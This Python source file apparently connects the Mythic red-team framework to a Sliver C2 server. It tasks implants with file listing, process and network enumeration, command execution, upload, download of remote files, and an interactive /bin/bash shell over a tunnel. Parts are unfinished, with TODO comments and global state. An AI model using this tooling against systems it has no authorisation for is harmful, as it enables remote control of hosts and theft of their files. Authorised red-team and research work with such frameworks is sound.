import asyncio
from mythic_container.MythicCommandBase import PTTaskMessageAllData
from mythic_container.MythicRPC import SendMythicRPCFileGetContent, MythicRPCFileGetContentMessage
from sliver import SliverClientConfig, SliverClient, client_pb2, sliver_pb2
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
from mythic_container.PayloadBuilder import *
import json
import gzip
from mythic_container.LoggingBase import *
from mythic_container.MythicGoRPC import *

# TODO: make this better, if using identify all fields that will be used / handle emptying when exiting
global_dict = {}

async def create_sliver_client(taskData: PTTaskMessageAllData):
    # TODO: should this configfile somehow be cached so we aren't always using rpc to pull it?
    # Should this be a class who's attributes then are updated with the config?

    extraInfoObj = json.loads(taskData.Callback.ExtraInfo)
    configfile = extraInfoObj['slivercfg_fileid']

    filecontent = await SendMythicRPCFileGetContent(MythicRPCFileGetContentMessage(
        AgentFileId=configfile
    ))

    config = SliverClientConfig.parse_config(filecontent.Content)
    client = SliverClient(config)
    await client.connect()
    
    return client

async def generate():
    # TODO: generate an implant based on config provided

    # implant_config = client_pb2.ImplantConfig(
    #     IsBeacon=True,
    #     Name="sliver-pytest-1",
    #     GOARCH="amd64",
    #     GOOS="linux",
    #     Format=client_pb2.OutputFormat.EXECUTABLE,
    #     ObfuscateSymbols=False,
    #     C2=[client_pb2.ImplantC2(Priority=0, URL="http://localhost:80")],
    # )

    # implant = await client.generate_implant(implant_config)

    return None

async def ifconfig(taskData: PTTaskMessageAllData):
    client = await create_sliver_client(taskData)

    callback_extra_info = json.loads(taskData.Callback.ExtraInfo)
    if (callback_extra_info['type'] == 'beacon'):
        interact = await client.interact_beacon(taskData.Payload.UUID)
        ifconfig_task = await interact.ifconfig()
        ifconfig_results = await ifconfig_task
    else:
        interact = await client.interact_session(taskData.Payload.UUID)
        ifconfig_results = await interact.ifconfig()

    return ifconfig_results

async def download(taskData: PTTaskMessageAllData):
    client = await create_sliver_client(taskData)

    callback_extra_info = json.loads(taskData.Callback.ExtraInfo)
    if (callback_extra_info['type'] == 'beacon'):
        interact = await client.interact_beacon(taskData.Payload.UUID)
        download_task = await interact.download(remote_path=taskData.args.get_arg('path'))
        download_results = await download_task
    else:
        interact = await client.interact_session(taskData.Payload.UUID)
        download_results = await interact.download(remote_path=taskData.args.get_arg('path'))

    plaintext = gzip.decompress(download_results.Data)

    return plaintext

async def upload(taskData: PTTaskMessageAllData):
    client = await create_sliver_client(taskData)

    filestuff = await SendMythicRPCFileGetContent(MythicRPCFileGetContentMessage(
        AgentFileId=taskData.args.get_arg('uuid')
    ))

    callback_extra_info = json.loads(taskData.Callback.ExtraInfo)
    if (callback_extra_info['type'] == 'beacon'):
        interact = await client.interact_beacon(taskData.Payload.UUID)
        upload_task = await interact.upload(
            remote_path=taskData.args.get_arg('path'),
            data=filestuff.Content
        )
        upload_results = await upload_task
    else:
        interact = await client.interact_session(taskData.Payload.UUID)
        upload_results = await interact.upload(
            remote_path=taskData.args.get_arg('path'),
            data=filestuff.Content
        )

    return upload_results

async def ls(taskData: PTTaskMessageAllData):
    client = await create_sliver_client(taskData)

    callback_extra_info = json.loads(taskData.Callback.ExtraInfo)
    if (callback_extra_info['type'] == 'beacon'):
        interact = await client.interact_beacon(taskData.Payload.UUID)
        ls_task = await interact.ls()
        ls_results = await ls_task
    else:
        interact = await client.interact_session(taskData.Payload.UUID)
        ls_results = await interact.ls()
        
    return ls_results

async def ps(taskData: PTTaskMessageAllData):
    client = await create_sliver_client(taskData)

    callback_extra_info = json.loads(taskData.Callback.ExtraInfo)
    if (callback_extra_info['type'] == 'beacon'):
        interact = await client.interact_beacon(taskData.Payload.UUID)
        ps_task = await interact.ps()
        ps_results = await ps_task
    else:
        interact = await client.interact_session(taskData.Payload.UUID)
        ps_results = await interact.ps()
        
    return ps_results

async def netstat(taskData: PTTaskMessageAllData):
    client = await create_sliver_client(taskData)

    callback_extra_info = json.loads(taskData.Callback.ExtraInfo)
    if (callback_extra_info['type'] == 'beacon'):
        interact = await client.interact_beacon(taskData.Payload.UUID)
        netstat_task = await interact.netstat(tcp=True, udp=True, ipv4=True, ipv6=True, listening=True)
        netstat_results = await netstat_task
    else:
        interact = await client.interact_session(taskData.Payload.UUID)
        netstat_results = await interact.netstat(tcp=True, udp=True, ipv4=True, ipv6=True, listening=True)
        
    return netstat_results

async def cd(taskData: PTTaskMessageAllData):
    client = await create_sliver_client(taskData)

    remote_path = taskData.args.get_arg('path')

    callback_extra_info = json.loads(taskData.Callback.ExtraInfo)
    if (callback_extra_info['type'] == 'beacon'):
        interact = await client.interact_beacon(taskData.Payload.UUID)
        cd_task = await interact.cd(remote_path=remote_path)
        cd_results = await cd_task
    else:
        interact = await client.interact_session(taskData.Payload.UUID)
        cd_results = await interact.cd(remote_path=remote_path)
        
    return cd_results

async def execute(taskData: PTTaskMessageAllData):
    client = await create_sliver_client(taskData)

    exe = taskData.args.get_arg('exe')
    args = taskData.args.get_arg('args')
    output = taskData.args.get_arg('output')

    callback_extra_info = json.loads(taskData.Callback.ExtraInfo)
    if (callback_extra_info['type'] == 'beacon'):
        interact = await client.interact_beacon(taskData.Payload.UUID)
        execute_task = await interact.execute(exe=exe, args=args, output=output)
        execute_results = await execute_task
    else:
        interact = await client.interact_session(taskData.Payload.UUID)
        execute_results = await interact.execute(exe=exe, args=args, output=output)

    return execute_results

async def mkdir(taskData: PTTaskMessageAllData):
    client = await create_sliver_client(taskData)

    remote_path = taskData.args.get_arg('path')

    callback_extra_info = json.loads(taskData.Callback.ExtraInfo)
    if (callback_extra_info['type'] == 'beacon'):
        interact = await client.interact_beacon(taskData.Payload.UUID)
        mkdir_results = await (await interact.mkdir(remote_path=remote_path))
    else:
        interact = await client.interact_session(taskData.Payload.UUID)
        mkdir_results = await interact.mkdir(remote_path=remote_path)

    return mkdir_results

async def pwd(taskData: PTTaskMessageAllData):
    client = await create_sliver_client(taskData)

    callback_extra_info = json.loads(taskData.Callback.ExtraInfo)
    if (callback_extra_info['type'] == 'beacon'):
        interact = await client.interact_beacon(taskData.Payload.UUID)
        pwd_task = await interact.pwd()
        pwd_results = await pwd_task
    else:
        interact = await client.interact_session(taskData.Payload.UUID)
        # already exposed in the client
        pwd_results = await interact.pwd()

        # _rpc = interact._stub
        # request = interact._request

        # # Example of using the rpc calls more directly?
        # req = sliver_pb2.PwdReq()
        # pwd_results = await _rpc.Pwd(request(req))

    return pwd_results

async def shell(taskData: PTTaskMessageAllData):
    task_info = json.loads(taskData.Callback.ExtraInfo)
    if (task_info['type'] == 'beacon'):
        return None # this only applies to sessions, not beacons

    client = await create_sliver_client(taskData)
    interact = await client.interact_session(taskData.Payload.UUID)
    # line 36 of shell.ts example, entering client.ts shell() line 458
    
    # typed as rpcpb.SliverRPCClient in TS 
    # but here is 'SliverRPCStub' type (python)
    # (confirmed in pwd code which is working)
    _rpc = interact._stub # doing this to match the this._rpc in the client.ts
    request = interact._request # helper function?
    _tunnelStream = _rpc.TunnelData() # line 622 in client.ts (in the connect() function)

    global_dict['interact'] = interact 
    global_dict['tunnel_stream'] = _tunnelStream
    
    tunnel = sliver_pb2.Tunnel(SessionID=interact.session_id) # line 461/462 client.ts
    rpcTunnel = await _rpc.CreateTunnel(tunnel) # line 464

    tunnelId = rpcTunnel.TunnelID # line 468 in client.ts
    tunnelData = sliver_pb2.TunnelData() # line 469 in client.ts
    tunnelData.TunnelID = tunnelId
    tunnelData.SessionID = interact.session_id
    await _tunnelStream.write(tunnelData) # bind tunnel? (line 519 client.ts and tunnels.go#L128)

    global_dict['tunnel_id'] = tunnelId
    global_dict['session_id'] = interact.session_id

    req = sliver_pb2.ShellReq() # line 474 in client.ts
    req.TunnelID = tunnelId
    req.Path = "/bin/bash"
    req.EnablePTY = True
    shell_result = await _rpc.Shell(request(req)) # line 479 in client.ts
    # TODO: send shell_result output to the task, to show which pid it has created / bound to

    async def read_server_data():
        async for data in _tunnelStream:
            await MythicRPC().execute("create_output", task_id=taskData.Task.ID, output=f'{data.Data.decode("utf-8")}\n')

    # TODO: don't let this run forever, keep track of it and stop it when 'exit' or something is called
    asyncio.create_task(read_server_data())

    return tunnel

# TODO: move this somewhere else? (shell functionality might be its own file by this point...)
class MyLogger(Log):
    async def new_task(self, msg: LoggingMessage) -> None:
        print('here@!')
        logger.info(msg)

        if msg.Data.DisplayParams == '':
            return
        
        # TODO: check if for this session / task, etc...

        interact = global_dict['interact']
        _tunnelStream = global_dict['tunnel_stream']
        tunnelId = global_dict['tunnel_id']
        sessionId = global_dict['session_id']

        if msg.Data.DisplayParams == 'exit\n':
            closeReq = client_pb2.CloseTunnelReq(TunnelID=tunnelId)
            await interact._stub.CloseTunnel(interact._request(closeReq))
            return


        data = sliver_pb2.TunnelData()
        data.TunnelID = tunnelId
        data.SessionID = sessionId

        # TODO: get control characters from InteractiveMessageType
        if msg.Data.InteractiveTaskType != 0:
            data.Data = InteractiveMessageType[msg.Data.InteractiveTaskType][1].to_bytes()
        else:
            data.Data = f"{msg.Data.DisplayParams}".encode('utf-8')
        await _tunnelStream.write(data)
        
        await SendMythicRPCTaskUpdate(MythicRPCTaskUpdateMessage(
            TaskID=msg.Data.ID,
            UpdateCompleted=True,
            UpdateStatus="success",
        ))
        # await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
        #     TaskID=msg.Data.ParentTaskID,
        #     Response=mythic_container.MythicCommandBase.InteractiveMessageType[msg.Data.InteractiveTaskType][0].encode()
        # ))

